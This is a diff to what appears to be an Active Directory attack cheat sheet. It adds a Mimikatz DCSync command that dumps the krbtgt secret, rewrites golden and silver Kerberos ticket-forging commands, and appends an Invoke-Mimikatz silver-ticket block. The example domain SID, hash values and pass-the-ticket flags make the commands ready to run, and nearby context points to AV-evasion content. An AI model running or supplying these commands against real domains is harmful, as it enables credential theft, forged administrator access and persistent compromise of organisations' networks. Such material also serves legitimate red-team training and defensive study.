@@ -156,23 +156,26 @@ Invoke-AllChecks
 # Tickets
 
 NTLM == RC4
-
+#### DCSync
+```
+lsadump::dcsync /user:<domain>\krbtgt
+```
 #### Golden
 
 ```
-Invoke-Mimikatz -Command '"kerberos::golden 
+kerberos::golden 
 /User:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
 538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
-id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
 
 #### Silver
 SPNs - https://adsecurity.org/?page_id=183
 ```
-Invoke-Mimikatz -Command '"kerberos::golden 
+kerberos::golden 
 /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
 538555522 /target:dc01.ecorp.local /service:HOST 
-/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"
+/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt
 ```
 
 ```
@@ -217,6 +220,13 @@ If functions not on remote host:-
 ```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'```
+
+``` 
+Invoke-Mimikatz -Command '"kerberos::golden 
+/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
+538555522 /target:dc01.ecorp.local /service:HOST 
+/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"'
+```
 
 
 #### AV Evasion
